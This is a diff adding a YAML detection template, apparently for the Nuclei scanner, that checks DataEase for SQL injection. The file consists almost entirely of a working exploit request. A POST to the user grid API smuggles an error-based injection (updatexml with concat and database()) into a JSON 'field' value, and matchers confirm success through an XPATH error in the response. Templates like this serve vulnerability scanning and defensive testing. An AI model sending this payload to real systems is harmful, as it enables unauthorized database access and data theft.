@@ -1,0 +1,28 @@
+id: poc-yaml-dataease-sql-injection
+info:
+  name: DataEase SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user/userGrid/1/10"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"orders":[],"conditions":[{"field":"concat(nick_name, ',' , email)) AND updatexml(1,concat(0x7e,database()),1) AND (1=1","operator":"like","value":"a"}]}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error:"
+      - type: word
+        part: body
+        words:
+          - "concat(nick_name, ',' , email)"
